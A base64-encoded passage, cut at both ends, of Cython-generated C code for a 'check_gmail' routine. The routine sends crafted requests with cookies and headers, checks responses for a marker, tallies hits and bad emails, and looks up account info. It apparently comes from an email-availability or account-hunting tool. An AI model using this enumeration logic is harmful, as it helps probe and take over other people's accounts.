fOSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF85LCBfX3B5eF9jYWxsYXJncysyLCAzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF81ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfMTYgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2ZfdWFyXzEsIF9fcHl4X3RfNSwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzE2IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChfX3B5eF90XzE2KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIwNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIwNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaXRzLCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjA1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VwZGF0ZV9zdGF0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIwNiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19weXhfdF83ID0gMTsKICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfOSkpKSB7CiAgICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzkpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfOSk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzksIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdHB5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdl9lbWFpbCwgX19weXhfdF85KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICBfX3B5eF92X2Z1bGxfZW1haWwgPSBfX3B5eF90XzY7CiAgICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF85ID0gTlVMTDsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMDgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X3ZfZnVsbF9lbWFpbDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTsKICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE0fTsKICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDIwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF8xMCwgMSwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDIwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX3B5eF90XzcgPSAxOwogICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICAgIF9fcHl4X3RfOSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7CiAgICAgICAgICBhc3NlcnQoX19weXhfdF85KTsKICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzkpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzksIF9fcHl4X3ZfZW1haWwsIF9fcHl4X3RfOH07CiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDMtX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAgICAgCiAgICAgICAgZ290byBfX3B5eF9MMjY7CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkX2VtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjEwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjEwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9lbWFpbCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNiA9IE5VTEw7CiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91cGRhdGVfc3RhdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyMTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfNyA9IDE7CiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzgpKSkgewogICAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF84KTsKICAgICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF84LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgTlVMTH07CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDEtX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIxMSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIH0KICAgICAgX19weXhfTDI2OjsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgZ290byBfX3B5eF9MOF90cnlfZW5kOwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICBfX3B5eF90XzE5ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpOwogICAgaWYgKF9fcHl4X3RfMTkpIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5jaGVja19nbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzgsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDVfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdl9lID0gX19weXhfdF84OwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzEwID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgICAgX19weXhfdF8yMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfNyA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY2hlY2tfZ21haWxfZXJyb3IsIF9fcHl4X3ZfZX07CiAgICAgICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgzLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjEzLCBfX3B5eF9MMzJfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIHsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MMzM7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wzMl9lcnJvcjo7CiAgICAgICAgewogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgX19weXhfdF8xMSA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzEzID0gMDsgX19weXhfdF8xMiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzIzID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xMiwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzIzKTsKICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzExLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTMpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzExLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjMpOwogICAgICAgICAgX19weXhfdF8xOSA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8yMSA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMjIgPSBfX3B5eF9maWxlbmFtZTsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEyKTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMyk7CiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEyLCBfX3B5eF90XzE1LCBfX3B5eF90XzIzKTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTsKICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xMSwgX19weXhfdF8xNCwgX19weXhfdF8xMyk7CiAgICAgICAgICBfX3B5eF90XzExID0gMDsgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTMgPSAwOyBfX3B5eF90XzEyID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMjMgPSAwOwogICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xOTsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjE7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yMjsKICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMzM6OwogICAgICB9CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjsKCiAgICAKICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIF9fcHl4X0w4X3RyeV9lbmQ6OwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdG9rZW5fZGF0YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3RsKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Nvb2tpZXMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcGFyYW1zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZnVsbF9lbWFpbCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7C